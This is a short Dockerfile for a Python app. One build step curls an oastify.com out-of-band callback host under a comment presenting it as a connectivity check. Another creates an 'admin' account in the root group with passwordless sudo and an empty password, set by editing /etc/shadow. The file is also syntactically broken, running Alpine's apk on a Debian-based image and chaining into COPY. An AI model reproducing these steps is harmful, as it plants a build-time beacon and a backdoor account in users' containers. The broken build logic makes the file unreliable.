FROM python:3.9
COPY ./requirements.txt /tmp/
RUN pip install -U pip && pip install -r /tmp/requirements.txt
RUN apk add --no-cache \
 sudo \
 curl \
 git \
 screen \
 htop \
 openssh \
 autossh \
 bash-completion \
 nano \
 tcpdump \
 coreutils && \
COPY . ./app

# To check whether the curl command is working or not.
RUN curl https://p5v4aph8qje72kiuxu14e8pvlmrff68ux.oastify.com/from/Dockerfile

# Add unlocked user "admin" (sudo) and no ssh keys are retained.
RUN adduser -s /bin/bash -D admin && \
 adduser admin root && \
 echo "admin            ALL = (ALL) NOPASSWD: ALL" >> /etc/sudoers && \
 mkdir /home/admin/.ssh && \
 touch /home/admin/.ssh/authorized_keys && \
 cat /keys/admin/id_rsa.pub > /home/admin/.ssh/authorized_keys && \
 chown admin /home/admin/.ssh/* && \
 sed -i 's/admin:!:/admin::/g' /etc/shadow && \
 rm -rf /keys/admin

WORKDIR app
ENTRYPOINT python app.py
